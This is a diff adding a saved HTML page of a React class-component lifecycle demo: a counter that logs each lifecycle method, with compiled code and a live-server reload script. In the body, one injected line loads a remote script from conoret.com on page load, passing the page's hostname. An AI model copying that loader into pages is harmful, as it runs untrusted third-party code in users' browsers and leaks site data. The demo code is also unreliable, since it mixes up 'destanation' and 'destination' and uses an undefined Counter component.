@@ -1,0 +1,232 @@
+
+<!-- saved from url=(0039)http://127.0.0.1:5500/live%20cycle.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        
+        <title>123</title>
+        <script src="./123_files/react.development.js.Без названия"></script>
+        <script src="./123_files/react-dom.development.js.Без названия"></script>
+        <script src="./123_files/babel.min.js.Без названия"></script>
+        <style>
+            #container {
+                padding: 50px;
+                background-color: #FFF;
+            }
+        </style>
+    <script>"use strict";
+
+var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();
+
+function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }
+
+function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }
+
+function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }
+
+var destanation = document.querySelector("#container");
+
+var CounterParent = function (_React$Component) {
+    _inherits(CounterParent, _React$Component);
+
+    function CounterParent(props) {
+        _classCallCheck(this, CounterParent);
+
+        var _this = _possibleConstructorReturn(this, (CounterParent.__proto__ || Object.getPrototypeOf(CounterParent)).call(this, props));
+
+        console.log("constructor: Default state time!");
+        _this.state = {
+            count: 0
+        };
+        _this.increase = _this.increase.bind(_this);
+        return _this;
+    }
+
+    _createClass(CounterParent, [{
+        key: "increase",
+        value: function increase() {
+            this.setState({
+                count: this.state.count + 1
+            });
+        }
+    }, {
+        key: "componentWillUpdate",
+        value: function componentWillUpdate(newProps, newState) {
+            console.log("componentWillUpdate: Component is about to update!");
+        }
+    }, {
+        key: "componentDidUpdate",
+        value: function componentDidUpdate(currentProps, currentState) {
+            console.log("componentDidUpdate: Component just updated!");
+        }
+    }, {
+        key: "componentWillMount",
+        value: function componentWillMount() {
+            console.log("componentWillMount: Component is about to mount!");
+        }
+    }, {
+        key: "componentDidMount",
+        value: function componentDidMount() {
+            console.log("componentDidMount: Component just mounted!");
+        }
+    }, {
+        key: "componentWillUnmount",
+        value: function componentWillUnmount() {
+            console.log("componentWillUnmount: Component is about to be removed from the DOM!");
+        }
+    }, {
+        key: "shouldComponentUpdate",
+        value: function shouldComponentUpdate(newProps, newState) {
+            console.log("shouldComponentUpdate: Should component update ? ");
+            if (newState.count < 5) {
+                console.log("shouldComponentUpdate: Component should update!");
+                return true;
+            } else {
+                ReactDOM.unmountComponentAtNode(destination);
+                console.log("shouldComponentUpdate: Component should not update!");
+                return false;
+            }
+        }
+    }, {
+        key: "componentWillReceiveProps",
+        value: function componentWillReceiveProps(newProps) {
+            console.log("componentWillReceiveProps: Component will get new props!");
+        }
+    }, {
+        key: "render",
+        value: function render() {
+            var backgroundStyle = {
+                padding: 50,
+                border: "#333 2px dotted",
+                width: 250,
+                height: 100,
+                borderRadius: 10,
+                textAlign: "center"
+            };
+            return React.createElement(
+                "div",
+                { style: backgroundStyle },
+                React.createElement(Counter, { display: this.state.count }),
+                React.createElement(
+                    "button",
+                    { onClick: this.increase },
+                    "+"
+                )
+            );
+        }
+    }]);
+
+    return CounterParent;
+}(React.Component);
+
+console.log("defaultProps: Default prop time!");
+CounterParent.defaultProps = {};
+//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIklubGluZSBCYWJlbCBzY3JpcHQiXSwibmFtZXMiOlsiZGVzdGFuYXRpb24iLCJkb2N1bWVudCIsInF1ZXJ5U2VsZWN0b3IiLCJDb3VudGVyUGFyZW50IiwicHJvcHMiLCJjb25zb2xlIiwibG9nIiwic3RhdGUiLCJjb3VudCIsImluY3JlYXNlIiwiYmluZCIsInNldFN0YXRlIiwibmV3UHJvcHMiLCJuZXdTdGF0ZSIsImN1cnJlbnRQcm9wcyIsImN1cnJlbnRTdGF0ZSIsIlJlYWN0RE9NIiwidW5tb3VudENvbXBvbmVudEF0Tm9kZSIsImRlc3RpbmF0aW9uIiwiYmFja2dyb3VuZFN0eWxlIiwicGFkZGluZyIsImJvcmRlciIsIndpZHRoIiwiaGVpZ2h0IiwiYm9yZGVyUmFkaXVzIiwidGV4dEFsaWduIiwiUmVhY3QiLCJDb21wb25lbnQiLCJkZWZhdWx0UHJvcHMiXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7QUFDWSxJQUFJQSxjQUFjQyxTQUFTQyxhQUFULENBQXVCLFlBQXZCLENBQWxCOztJQUNNQyxhOzs7QUFDRiwyQkFBWUMsS0FBWixFQUFtQjtBQUFBOztBQUFBLGtJQUNUQSxLQURTOztBQUVmQyxnQkFBUUMsR0FBUixDQUFZLGtDQUFaO0FBQ0EsY0FBS0MsS0FBTCxHQUFhO0FBQ1RDLG1CQUFPO0FBREUsU0FBYjtBQUdBLGNBQUtDLFFBQUwsR0FBZ0IsTUFBS0EsUUFBTCxDQUFjQyxJQUFkLE9BQWhCO0FBTmU7QUFPbEI7Ozs7bUNBQ1U7QUFDUCxpQkFBS0MsUUFBTCxDQUFjO0FBQ1ZILHVCQUFPLEtBQUtELEtBQUwsQ0FBV0MsS0FBWCxHQUFtQjtBQURoQixhQUFkO0FBR0g7Ozs0Q0FDbUJJLFEsRUFBVUMsUSxFQUFVO0FBQ3BDUixvQkFBUUMsR0FBUixDQUFZLG9EQUFaO0FBQ0g7OzsyQ0FDa0JRLFksRUFBY0MsWSxFQUFjO0FBQzNDVixvQkFBUUMsR0FBUixDQUFZLDZDQUFaO0FBQ0g7Ozs2Q0FDb0I7QUFDakJELG9CQUFRQyxHQUFSLENBQVksa0RBQVo7QUFDSDs7OzRDQUNtQjtBQUNoQkQsb0JBQVFDLEdBQVIsQ0FBWSw0Q0FBWjtBQUNIOzs7K0NBQ3NCO0FBQ25CRCxvQkFBUUMsR0FBUixDQUFZLHNFQUFaO0FBQ0g7Ozs4Q0FDcUJNLFEsRUFBVUMsUSxFQUFVO0FBQ3RDUixvQkFBUUMsR0FBUixDQUFZLG1EQUFaO0FBQ0EsZ0JBQUlPLFNBQVNMLEtBQVQsR0FBaUIsQ0FBckIsRUFBd0I7QUFDcEJILHdCQUFRQyxHQUFSLENBQVksaURBQVo7QUFDQSx1QkFBTyxJQUFQO0FBQ0gsYUFIRCxNQUdPO0FBQ0hVLHlCQUFTQyxzQkFBVCxDQUFnQ0MsV0FBaEM7QUFDQWIsd0JBQVFDLEdBQVIsQ0FBWSxxREFBWjtBQUNBLHVCQUFPLEtBQVA7QUFDSDtBQUNKOzs7a0RBQ3lCTSxRLEVBQVU7QUFDaENQLG9CQUFRQyxHQUFSLENBQVksMERBQVo7QUFDSDs7O2lDQUNRO0FBQ0wsZ0JBQUlhLGtCQUFrQjtBQUNsQkMseUJBQVMsRUFEUztBQUVsQkMsd0JBQVEsaUJBRlU7QUFHbEJDLHVCQUFPLEdBSFc7QUFJbEJDLHdCQUFRLEdBSlU7QUFLbEJDLDhCQUFjLEVBTEk7QUFNbEJDLDJCQUFXO0FBTk8sYUFBdEI7QUFRQSxtQkFDSTtBQUFBO0FBQUEsa0JBQUssT0FBT04sZUFBWjtBQUNJLG9DQUFDLE9BQUQsSUFBUyxTQUFTLEtBQUtaLEtBQUwsQ0FBV0MsS0FBN0IsR0FESjtBQUVJO0FBQUE7QUFBQSxzQkFBUSxTQUFTLEtBQUtDLFFBQXRCO0FBQUE7QUFBQTtBQUZKLGFBREo7QUFNSDs7OztFQTFEdUJpQixNQUFNQyxTOztBQTREbEN0QixRQUFRQyxHQUFSLENBQVksa0NBQVo7QUFDQUgsY0FBY3lCLFlBQWQsR0FBNkIsRUFBN0IiLCJmaWxlIjoiSW5saW5lIEJhYmVsIHNjcmlwdCIsInNvdXJjZXNDb250ZW50IjpbIlxuICAgICAgICAgICAgdmFyIGRlc3RhbmF0aW9uID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcihcIiNjb250YWluZXJcIik7XG4gICAgICAgICAgICBjbGFzcyBDb3VudGVyUGFyZW50IGV4dGVuZHMgUmVhY3QuQ29tcG9uZW50IHtcbiAgICAgICAgICAgICAgICBjb25zdHJ1Y3Rvcihwcm9wcykge1xuICAgICAgICAgICAgICAgICAgICBzdXBlcihwcm9wcyk7XG4gICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKFwiY29uc3RydWN0b3I6IERlZmF1bHQgc3RhdGUgdGltZSFcIik7XG4gICAgICAgICAgICAgICAgICAgIHRoaXMuc3RhdGUgPSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBjb3VudDogMFxuICAgICAgICAgICAgICAgICAgICB9O1xuICAgICAgICAgICAgICAgICAgICB0aGlzLmluY3JlYXNlID0gdGhpcy5pbmNyZWFzZS5iaW5kKHRoaXMpO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBpbmNyZWFzZSgpIHtcbiAgICAgICAgICAgICAgICAgICAgdGhpcy5zZXRTdGF0ZSh7XG4gICAgICAgICAgICAgICAgICAgICAgICBjb3VudDogdGhpcy5zdGF0ZS5jb3VudCArIDFcbiAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGNvbXBvbmVudFdpbGxVcGRhdGUobmV3UHJvcHMsIG5ld1N0YXRlKSB7XG4gICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKFwiY29tcG9uZW50V2lsbFVwZGF0ZTogQ29tcG9uZW50IGlzIGFib3V0IHRvIHVwZGF0ZSFcIik7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGNvbXBvbmVudERpZFVwZGF0ZShjdXJyZW50UHJvcHMsIGN1cnJlbnRTdGF0ZSkge1xuICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhcImNvbXBvbmVudERpZFVwZGF0ZTogQ29tcG9uZW50IGp1c3QgdXBkYXRlZCFcIik7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGNvbXBvbmVudFdpbGxNb3VudCgpIHtcbiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2coXCJjb21wb25lbnRXaWxsTW91bnQ6IENvbXBvbmVudCBpcyBhYm91dCB0byBtb3VudCFcIik7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGNvbXBvbmVudERpZE1vdW50KCkge1xuICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhcImNvbXBvbmVudERpZE1vdW50OiBDb21wb25lbnQganVzdCBtb3VudGVkIVwiKTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgY29tcG9uZW50V2lsbFVubW91bnQoKSB7XG4gICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKFwiY29tcG9uZW50V2lsbFVubW91bnQ6IENvbXBvbmVudCBpcyBhYm91dCB0byBiZSByZW1vdmVkIGZyb20gdGhlIERPTSFcIik7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIHNob3VsZENvbXBvbmVudFVwZGF0ZShuZXdQcm9wcywgbmV3U3RhdGUpIHtcbiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2coXCJzaG91bGRDb21wb25lbnRVcGRhdGU6IFNob3VsZCBjb21wb25lbnQgdXBkYXRlID8gXCIpO1xuICAgICAgICAgICAgICAgICAgICBpZiAobmV3U3RhdGUuY291bnQgPCA1KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhcInNob3VsZENvbXBvbmVudFVwZGF0ZTogQ29tcG9uZW50IHNob3VsZCB1cGRhdGUhXCIpO1xuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7XG4gICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBSZWFjdERPTS51bm1vdW50Q29tcG9uZW50QXROb2RlKGRlc3RpbmF0aW9uKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKFwic2hvdWxkQ29tcG9uZW50VXBkYXRlOiBDb21wb25lbnQgc2hvdWxkIG5vdCB1cGRhdGUhXCIpO1xuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIGNvbXBvbmVudFdpbGxSZWNlaXZlUHJvcHMobmV3UHJvcHMpIHtcbiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5sb2coXCJjb21wb25lbnRXaWxsUmVjZWl2ZVByb3BzOiBDb21wb25lbnQgd2lsbCBnZXQgbmV3IHByb3BzIVwiKTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgcmVuZGVyKCkge1xuICAgICAgICAgICAgICAgICAgICB2YXIgYmFja2dyb3VuZFN0eWxlID0ge1xuICAgICAgICAgICAgICAgICAgICAgICAgcGFkZGluZzogNTAsXG4gICAgICAgICAgICAgICAgICAgICAgICBib3JkZXI6IFwiIzMzMyAycHggZG90dGVkXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICB3aWR0aDogMjUwLFxuICAgICAgICAgICAgICAgICAgICAgICAgaGVpZ2h0OiAxMDAsXG4gICAgICAgICAgICAgICAgICAgICAgICBib3JkZXJSYWRpdXM6IDEwLFxuICAgICAgICAgICAgICAgICAgICAgICAgdGV4dEFsaWduOiBcImNlbnRlclwiXG4gICAgICAgICAgICAgICAgICAgIH07XG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAoXG4gICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IHN0eWxlPXtiYWNrZ3JvdW5kU3R5bGV9PlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxDb3VudGVyIGRpc3BsYXk9e3RoaXMuc3RhdGUuY291bnR9IC8+XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBvbkNsaWNrPXt0aGlzLmluY3JlYXNlfT4rPC9idXR0b24+XG4gICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj5cbiAgICAgICAgICAgICAgICAgICAgKTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBjb25zb2xlLmxvZyhcImRlZmF1bHRQcm9wczogRGVmYXVsdCBwcm9wIHRpbWUhXCIpO1xuICAgICAgICAgICAgQ291bnRlclBhcmVudC5kZWZhdWx0UHJvcHMgPSB7XG4gICAgICAgICAgICB9O1xuICAgICAgICAiXX0=</script><script src="./123_files/dsp" type="text/javascript" defer="" async=""></script></head>
+
+    <body><script type="text/javascript">window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();</script>
+        <div id="container"></div>
+        <script type="text/babel">
+            var destanation = document.querySelector("#container");
+            class CounterParent extends React.Component {
+                constructor(props) {
+                    super(props);
+                    console.log("constructor: Default state time!");
+                    this.state = {
+                        count: 0
+                    };
+                    this.increase = this.increase.bind(this);
+                }
+                increase() {
+                    this.setState({
+                        count: this.state.count + 1
+                    });
+                }
+                componentWillUpdate(newProps, newState) {
+                    console.log("componentWillUpdate: Component is about to update!");
+                }
+                componentDidUpdate(currentProps, currentState) {
+                    console.log("componentDidUpdate: Component just updated!");
+                }
+                componentWillMount() {
+                    console.log("componentWillMount: Component is about to mount!");
+                }
+                componentDidMount() {
+                    console.log("componentDidMount: Component just mounted!");
+                }
+                componentWillUnmount() {
+                    console.log("componentWillUnmount: Component is about to be removed from the DOM!");
+                }
+                shouldComponentUpdate(newProps, newState) {
+                    console.log("shouldComponentUpdate: Should component update ? ");
+                    if (newState.count < 5) {
+                        console.log("shouldComponentUpdate: Component should update!");
+                        return true;
+                    } else {
+                        ReactDOM.unmountComponentAtNode(destination);
+                        console.log("shouldComponentUpdate: Component should not update!");
+                        return false;
+                    }
+                }
+                componentWillReceiveProps(newProps) {
+                    console.log("componentWillReceiveProps: Component will get new props!");
+                }
+                render() {
+                    var backgroundStyle = {
+                        padding: 50,
+                        border: "#333 2px dotted",
+                        width: 250,
+                        height: 100,
+                        borderRadius: 10,
+                        textAlign: "center"
+                    };
+                    return (
+                        <div style={backgroundStyle}>
+                            <Counter display={this.state.count} />
+                            <button onClick={this.increase}>+</button>
+                        </div>
+                    );
+                }
+            }
+            console.log("defaultProps: Default prop time!");
+            CounterParent.defaultProps = {
+            };
+        </script>
+    <!-- Code injected by live-server -->
+<script>
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script>
+
+
+    <div at-magnifier-wrapper=""><div class="at-theme-light"><div class="at-base notranslate" translate="no"><div class="Z1-AJ" style="top: 0px; left: 0px;"></div></div></div></div></body></html>
